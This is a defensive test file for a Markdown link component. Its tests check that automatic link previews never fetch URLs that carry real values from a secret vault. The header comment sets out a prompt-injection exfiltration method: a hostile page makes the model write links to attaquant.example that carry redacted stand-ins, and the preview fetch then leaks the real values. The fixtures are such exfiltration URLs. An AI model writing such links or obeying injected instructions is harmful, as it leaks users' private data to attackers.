// @vitest-environment jsdom
import { describe, expect, it, vi } from "vitest";
import { Markdown } from "../Markdown";
import { mount } from "../../../testKit";

/**
 * THE file the guard's comment claimed to be pinned by, and which did not exist — which
 * is how the guard came to be a test that does not test the attack.
 *
 * The attack: the model only ever holds FAKES, so a prompt-injected page can make it
 * write `[voir](https://attaquant.example/?d=<fake>)`. The reply is un-redacted as plain
 * text BEFORE markdown parses it, and `realLinkHref` fixes up whatever encoding survived,
 * so the href that reaches the preview fetch holds the REAL value. That fetch is
 * AUTOMATIC — no click — and its host is the attacker's: one link per fake turns the
 * whole vault into a fake→real oracle.
 *
 * The old gate was `href !== props.href`: "did un-redacting CHANGE the href?". It only
 * ever fired for the `%20`/`+` forms, because those are the ones the plain-text pass
 * misses. Written UNENCODED, the fake is already the real value by the time this
 * component sees it, the two hrefs are equal, and the fetch went out. That is the case
 * the first test below covers, and the one that used to leak.
 */

// fake → REAL. Two shapes on purpose: a value with a space (the only case the old guard
// caught, because the plain-text un-redaction misses its `%20` form) and one WITHOUT —
// an address, which needs no encoding at all and so slipped through untouched.
const VAULT = {
  "Karl Studio": "Norvik Group",
  "contact@karl-studio.test": "lea.morvan@norvik.example",
};

/** `linkPreviews` opt-in ON + a platform that can unfurl: the state where a fetch is
 *  otherwise expected, so a missing fetch below is the GUARD, not a missing capability. */
const render = (content: string, preview = vi.fn(async () => null)) =>
  mount(<Markdown content={content} vault={VAULT} linkPreviews />, {
    host: { links: { preview } } as never,
  }).then((ui) => ({ ui, preview }));

describe("MarkdownLink — l'aperçu automatique et les valeurs du coffre", () => {
  it("NE PRÉ-VISUALISE PAS un lien qui porte une valeur réelle NON ENCODÉE", async () => {
    // LA régression : rien à ré-encoder ici, donc `realLinkHref` rend l'href INCHANGÉ et
    // l'ancienne garde (« l'href a-t-il changé ? ») ne voyait rien. La valeur, elle, est
    // bien là — la réponse est démasquée avant que markdown ne l'analyse.
    const { ui, preview } = await render(
      "[voir](https://attaquant.example/?d=lea.morvan@norvik.example)",
    );
    expect(ui.find<HTMLAnchorElement>("a.md-link").getAttribute("href")).toContain(
      "lea.morvan@norvik.example",
    );
    expect(preview).not.toHaveBeenCalled();
    expect(ui.maybe(".md-link-card")).toBeNull();
    await ui.unmount();
  });

  it("ne pré-visualise pas non plus la forme percent-encodée", async () => {
    // Le seul cas que l'ancienne garde attrapait : il doit continuer de tenir.
    const { ui, preview } = await render("[voir](https://attaquant.example/?d=Karl%20Studio)");
    expect(preview).not.toHaveBeenCalled();
    await ui.unmount();
  });

  it("ne pré-visualise pas la forme `+`", async () => {
    const { ui, preview } = await render("[voir](https://attaquant.example/?d=Karl+Studio)");
    expect(preview).not.toHaveBeenCalled();
    await ui.unmount();
  });

  it("ne pré-visualise pas une valeur posée dans le CHEMIN", async () => {
    const { ui, preview } = await render("[voir](https://attaquant.example/Norvik%20Group/x)");
    expect(preview).not.toHaveBeenCalled();
    await ui.unmount();
  });

  it("un lien ORDINAIRE se pré-visualise comme avant — la garde ne tue pas la fonction", async () => {
    const { ui, preview } = await render("[Le Monde](https://lemonde.fr/article/123)");
    expect(preview).toHaveBeenCalledWith("https://lemonde.fr/article/123");
    await ui.unmount();
  });

  it("le CLIC reste possible : l'ancre garde la vraie destination", async () => {
    // Rule 11's outward-real: what the USER dispatches goes to the right page. Only the
    // AUTOMATIC fetch is withheld.
    const { ui } = await render("[voir](https://attaquant.example/?d=Karl%20Studio)");
    const a = ui.find<HTMLAnchorElement>("a.md-link");
    expect(decodeURIComponent(a.getAttribute("href")!)).toContain("Norvik Group");
    await ui.unmount();
  });
});
